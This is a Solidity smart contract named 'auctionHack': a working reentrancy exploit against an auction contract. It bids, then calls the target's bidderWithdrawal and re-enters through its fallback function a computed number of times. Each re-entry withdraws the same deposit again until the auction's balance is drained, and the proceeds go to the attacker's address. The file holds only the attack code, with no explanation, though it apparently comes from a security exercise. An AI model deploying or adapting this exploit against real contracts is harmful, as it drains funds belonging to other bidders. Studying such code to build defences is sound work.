//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface auction {
    function bid() external payable;
    function bidderWithdrawal() external;
    function getBalance() external view returns(uint);
}

contract auctionHack {
    address payable public owner;
    auction public auctionContract;
    uint public loopcounter;
    uint public loop = 0;
    uint public contractBalance;

    constructor(address _auctionContract) {
        auctionContract = auction(_auctionContract);
        owner = payable(msg.sender);
    }

    function bidderWithdrawal2() public {
        loopcounter = (address(auctionContract).balance/auctionContract.getBalance()) - 1;
        auctionContract.bidderWithdrawal();
        contractBalance = address(this).balance;
        (bool tryToSend, /*Data*/) = owner.call{value: contractBalance}("");
        require(tryToSend, "Transaction failed to go through.");
    }

    function bid() public payable {
        auctionContract.bid{value: msg.value}();
    }

    fallback() external payable {
        if(loop < loopcounter) {
            loop += 1; 
            auctionContract.bidderWithdrawal();
        }
    }

}
